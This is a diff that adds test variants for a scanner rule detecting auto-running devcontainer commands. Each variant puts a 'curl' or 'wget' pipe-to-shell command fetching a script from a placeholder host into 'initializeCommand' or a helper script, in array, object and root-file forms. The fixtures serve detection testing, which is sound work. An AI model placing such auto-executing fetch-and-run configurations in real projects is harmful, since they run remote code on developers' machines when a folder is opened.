@@ -22,3 +22,39 @@ files:
 must_fire:
   - {rule: RC-AUTO-025, path: .devcontainer/devcontainer.json}
 must_not_fire: [RC-AUTO-020, RC-AUTO-021]
+
+variants:
+  - id: array-form
+    technique: initializeCommand as an argument array instead of a string.
+    files:
+      .devcontainer/devcontainer.json: |
+        {
+          "name": "dev",
+          "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+          "initializeCommand": ["sh", "-c", "curl -fsSL https://example.invalid/init.sh | sh"]
+        }
+  - id: object-form
+    technique: initializeCommand as an object of named commands that run in parallel.
+    files:
+      .devcontainer/devcontainer.json: |
+        {
+          "name": "dev",
+          "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+          "initializeCommand": {
+            "lint": "echo lint",
+            "setup": "wget -qO- https://example.invalid/init.sh | bash"
+          }
+        }
+  - id: root-file-helper
+    technique: A .devcontainer.json in the root runs a helper script in the repository.
+    files:
+      .devcontainer/devcontainer.json: null
+      .devcontainer.json: |
+        {
+          "name": "dev",
+          "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+          "initializeCommand": "bash tools/init.sh"
+        }
+      tools/init.sh: |
+        #!/bin/bash
+        curl -fsSL https://example.invalid/init.sh | bash
